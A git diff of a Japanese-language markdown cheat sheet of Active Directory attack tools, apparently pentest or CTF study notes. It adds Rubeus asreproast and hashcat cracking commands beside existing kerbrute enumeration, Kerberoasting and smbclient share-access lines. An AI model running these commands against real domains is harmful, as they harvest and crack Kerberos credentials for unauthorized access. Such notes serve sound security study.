@@ -43,11 +43,13 @@
   - 「`./kerbrute` userenum -d ドメイン名 --dc ドメコンIP Wordlists名 -o 出力ファイル名」Domainユーザの列挙
 - [Rubeus](https://github.com/GhostPack/Rubeus) (kali×, C#)  
   攻撃対象のWindowsマシンで実行する、Post-Exploitationのイメージ  
-  - 「`Rubeus.exe` harvest /interval:秒数」指定した秒数間、TGSを収集する  
+  - 「`Rubeus.exe` harvest /interval:秒数」指定した秒数間、TGTを収集する  
   - 「`Rubeus.exe` kerberoast /nowrap /outfile:出力ファイル」  
     Kerberoasting（取得したユーザのSPNに対応したアカウントのTGSを取得できる）を実行（nowrapは改行なしで結果出力）  
     TGSは「`hashcat` -a 0 -m 13100 TGSファイル Passwordリスト」でクラックできる（JohnではTGSをサポートしてない）
-  - 「`Rubeus.exe `」
+  - 「`Rubeus.exe` asreproast /format:hashcat /outfile:出力ファイル」  
+    ASREPRoast（Kerberos事前認証を必要としていないユーザのTGTを取得できる）を実行  
+    ASREPは「`hashcat` -a 0 -m 18200 ASREPファイル Passwordリスト」でクラックできる（Johnでもクラックできる）
 - smbclient (kali〇, ELF)  
   「`smbcleint` -L IPアドレス or FQDN -U ユーザ名%パスワード」共有フォルダの列挙  
   「`smbclient` //IPアドレス/共有名 -U ユーザ名%パスワード」共有フォルダにアクセス
